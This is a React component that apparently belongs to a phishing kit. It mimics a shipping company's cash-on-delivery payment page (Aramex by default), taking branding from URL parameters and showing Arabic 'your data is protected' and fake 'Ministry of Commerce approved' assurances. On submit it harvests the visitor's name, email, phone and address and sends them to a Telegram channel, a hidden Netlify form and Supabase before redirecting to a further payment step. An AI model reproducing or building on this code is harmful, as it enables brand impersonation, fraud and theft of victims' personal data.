import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, error } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  // Get query parameters from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  // Use company branding colors
  const colors = {
    primary: branding.colors?.primary || "#CE1126",
    secondary: branding.colors?.secondary || "#00732F",
    accent: branding.colors?.accent || "#000000",
    background: branding.colors?.background || "#FFFFFF",
    surface: branding.colors?.surface || "#F5F5F5",
    border: branding.colors?.border || "#E0E0E0",
    text: branding.colors?.text || "#000000",
    textLight: branding.colors?.textLight || "#666666",
    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
  };

  // Use branding properties with fallbacks
  const brandingProps = {
    colors,
    fonts: branding.fonts || { primaryAr: "Cairo", primary: "Cairo" },
    shadows: branding.shadows || {
      sm: "0 1px 2px 0 rgba(0, 0, 0, 0.05)",
      md: "0 4px 6px -1px rgba(0, 0, 0, 0.1)",
      lg: "0 10px 15px -3px rgba(0, 0, 0, 0.1)"
    },
    gradients: branding.gradients || {
      primary: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
    },
    borderRadius: branding.borderRadius || {
      md: "8px",
      lg: "12px"
    },
    name: branding.name || serviceName,
    nameAr: branding.nameAr || serviceName,
    logo: branding.logo
  };

  // Use hero image from branding with fallback
  const heroImage = branding.heroImage || "/assets/hero-bg.jpg";

  // Use dynamic company meta for OG tags
  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const shippingInfo = linkData?.payload as any;

  // Get payer type from shipping info (default to "recipient" for backward compatibility)
  const payerType = shippingInfo?.payer_type || "recipient";

  // Get country from link data (must be before using currency functions)
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";

  // Use currency from URL parameter if available, otherwise from country data
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);

  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) {
      console.error('No link data available');
      return;
    }

    // Submit to Netlify Forms
    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    // Send data to Telegram
    const productionDomain = window.location.origin;
    const telegramResult = await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${productionDomain}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    // Save customer data to the link's payload in Supabase for cross-device compatibility
    try {
      const customerData = {
        ...linkData.payload,
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formattedAmount
        },
        selectedCountry: countryCode
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: customerData
      });
    } catch (error) {
      // Silent error handling
    }

    navigate(`/pay/${id}/details`);
  };
  
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <div className="text-xl text-muted-foreground">جاري التحميل...</div>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background p-4">
        <div className="text-center max-w-md">
          <h2 className="text-2xl font-bold mb-2 text-destructive">حدث خطأ</h2>
          <p className="text-muted-foreground mb-4">لم نتمكن من تحميل بيانات الدفع. يرجى المحاولة مرة أخرى.</p>
          <button 
            onClick={() => window.location.reload()} 
            className="px-4 py-2 bg-primary text-primary-foreground rounded-md hover:opacity-90"
          >
            إعادة المحاولة
          </button>
        </div>
      </div>
    );
  }
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      {/* Dynamic OG Image via direct meta tag injection */}
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
      </Helmet>
      <div className="min-h-screen" style={{ backgroundColor: brandingProps.colors.surface }} dir="rtl">
        {/* Hero Section with Company Branding */}
        <div className="relative w-full h-64 overflow-hidden">
          <img
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div
            className="absolute inset-0 bg-gradient-to-b opacity-70"
            style={{
              background: `linear-gradient(to bottom, ${brandingProps.colors.primary}40, ${brandingProps.colors.primary}80)`
            }}
          />

          {/* Company Logo Overlay */}
          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
            <div
              className="rounded-2xl p-3 sm:p-4 shadow-lg"
              style={{
                backgroundColor: 'rgba(255, 255, 255, 0.95)',
                border: `2px solid ${brandingProps.colors.primary}`,
                boxShadow: brandingProps.shadows.md
              }}
            >
              {brandingProps.logo && (
                <img
                  src={brandingProps.logo}
                  alt={serviceName}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              )}
            </div>
          </div>

          {/* Title and Info Overlay */}
          <div className="absolute bottom-6 right-6 text-white max-w-2xl">
            <div className="text-right">
              <h2
                className="text-2xl font-bold mb-2"
                style={{
                  fontFamily: brandingProps.fonts.primaryAr,
                  textShadow: '2px 2px 4px rgba(0,0,0,0.5)'
                }}
              >
                {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
              </h2>
              <p
                className="text-sm opacity-90 mb-1"
                style={{
                  fontFamily: brandingProps.fonts.primaryAr,
                  textShadow: '1px 1px 2px rgba(0,0,0,0.5)'
                }}
              >
                {brandingProps.name} - {brandingProps.nameAr}
              </p>
              <p
                className="text-lg font-semibold"
                style={{
                  fontFamily: brandingProps.fonts.primaryAr,
                  textShadow: '1px 1px 2px rgba(0,0,0,0.5)'
                }}
              >
                {formattedAmount}
              </p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-4 py-8">
          <div className="max-w-4xl mx-auto">
            {/* Security Notice with Company Branding */}
            <div
              className="mb-6 p-4 bg-white rounded-lg border-r-4"
              style={{ borderRightColor: colors.secondary }}
            >
              <div className="flex items-start gap-3">
                <Shield className="w-5 h-5 mt-0.5" style={{ color: colors.secondary }} />
                <div>
                  <h3
                    className="font-semibold text-sm mb-1"
                    style={{
                      color: '#000000',
                      fontFamily: branding.fonts.primaryAr || branding.fonts.primary
                    }}
                  >
                    بياناتك محمية
                  </h3>
                  <p
                    className="text-xs"
                    style={{ color: branding.colors.textLight }}
                  >
                    نحن نستخدم أعلى معايير الأمان لحماية معلوماتك الشخصية والمالية
                  </p>
                </div>
              </div>
            </div>

            <Card
              className="p-6 sm:p-8 shadow-lg border-0 rounded-lg overflow-hidden"
              style={{
                background: brandingProps.colors.background,
                boxShadow: brandingProps.shadows.lg
              }}
            >
              <div className="mb-6">
                <div className="flex items-center gap-3 mb-2">
                  <div
                    className="w-12 h-12 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: `${brandingProps.colors.primary}15` }}
                  >
                    <User className="w-6 h-6" style={{ color: brandingProps.colors.primary }} />
                  </div>
                  <div>
                    <h3
                      className="text-lg font-bold"
                      style={{
                        color: '#000000',
                        fontFamily: brandingProps.fonts.primaryAr
                      }}
                    >
                      {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
                    </h3>
                    <p
                      className="text-sm"
                      style={{ color: brandingProps.colors.textLight }}
                    >
                      الرجاء إدخال جميع البيانات المطلوبة
                    </p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleProceed} className="space-y-5">
                {/* Customer Name */}
                <div>
                  <Label
                    htmlFor="name"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: '#000000',
                      fontFamily: brandingProps.fonts.primaryAr
                    }}
                  >
                    <User className="w-4 h-4" />
                    الاسم الكامل *
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: brandingProps.colors.border,
                      borderRadius: brandingProps.borderRadius.md,
                      fontFamily: brandingProps.fonts.primaryAr,
                      color: '#000000'
                    }}
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>

                {/* Customer Email */}
                <div>
                  <Label
                    htmlFor="email"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: '#000000',
                      fontFamily: brandingProps.fonts.primaryAr
                    }}
                  >
                    <Mail className="w-4 h-4" />
                    البريد الإلكتروني *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: brandingProps.colors.border,
                      borderRadius: brandingProps.borderRadius.md,
                      fontFamily: brandingProps.fonts.primaryAr,
                      color: '#000000'
                    }}
                    placeholder="example@email.com"
                  />
                </div>

                {/* Customer Phone */}
                <div>
                  <Label
                    htmlFor="phone"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: '#000000',
                      fontFamily: brandingProps.fonts.primaryAr
                    }}
                  >
                    <Phone className="w-4 h-4" />
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: brandingProps.colors.border,
                      borderRadius: brandingProps.borderRadius.md,
                      fontFamily: brandingProps.fonts.primaryAr,
                      color: '#000000'
                    }}
                    placeholder={`${phoneCode} ${phonePlaceholder}`}
                  />
                </div>

                {/* Residential Address */}
                <div>
                  <Label
                    htmlFor="address"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: '#000000',
                      fontFamily: brandingProps.fonts.primaryAr
                    }}
                  >
                    <MapPin className="w-4 h-4" />
                    العنوان *
                  </Label>
                  <Input
                    id="address"
                    value={residentialAddress}
                    onChange={(e) => setResidentialAddress(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: brandingProps.colors.border,
                      borderRadius: brandingProps.borderRadius.md,
                      fontFamily: brandingProps.fonts.primaryAr,
                      color: '#000000'
                    }}
                    placeholder="أدخل عنوانك الكامل"
                  />
                </div>

                {/* Payment Summary */}
                <div
                  className="mt-6 p-4 rounded-lg"
                  style={{
                    backgroundColor: brandingProps.colors.surface,
                    borderRadius: brandingProps.borderRadius.md
                  }}
                >
                  <h4
                    className="font-semibold mb-3"
                    style={{
                      color: '#000000',
                      fontFamily: brandingProps.fonts.primaryAr
                    }}
                  >
                    ملخص المبلغ
                  </h4>
                  <div className="flex justify-between items-center">
                    <span
                      className="text-sm"
                      style={{ color: brandingProps.colors.textLight }}
                    >
                      المبلغ الإجمالي
                    </span>
                    <span
                      className="text-xl font-bold"
                      style={{ color: brandingProps.colors.primary }}
                    >
                      {formattedAmount}
                    </span>
                  </div>
                </div>

                {/* Proceed Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full h-14 text-lg font-bold mt-6 transition-all hover:opacity-90"
                  style={{
                    background: brandingProps.gradients.primary,
                    color: brandingProps.colors.textOnPrimary,
                    borderRadius: brandingProps.borderRadius.lg,
                    boxShadow: brandingProps.shadows.md,
                    fontFamily: brandingProps.fonts.primaryAr
                  }}
                  disabled={
                    !customerName ||
                    !customerEmail ||
                    !customerPhone ||
                    !residentialAddress
                  }
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-5 h-5" />
                </Button>

                <p
                  className="text-xs text-center mt-4"
                  style={{
                    color: brandingProps.colors.textLight,
                    fontFamily: brandingProps.fonts.primaryAr
                  }}
                >
                  بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
                </p>
              </form>
            </Card>

            {/* Security Footer */}
            <div className="mt-6 text-center">
              <div
                className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm"
                style={{ boxShadow: brandingProps.shadows.sm }}
              >
                <Shield className="w-4 h-4" style={{ color: brandingProps.colors.secondary }} />
                <span
                  className="text-xs font-medium"
                  style={{
                    color: brandingProps.colors.text,
                    fontFamily: brandingProps.fonts.primaryAr
                  }}
                >
                  معتمد من وزارة التجارة
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Hidden Netlify Form */}
      <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="address" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="linkId" />
      </form>
    </>
  );
};

export default PaymentRecipient;
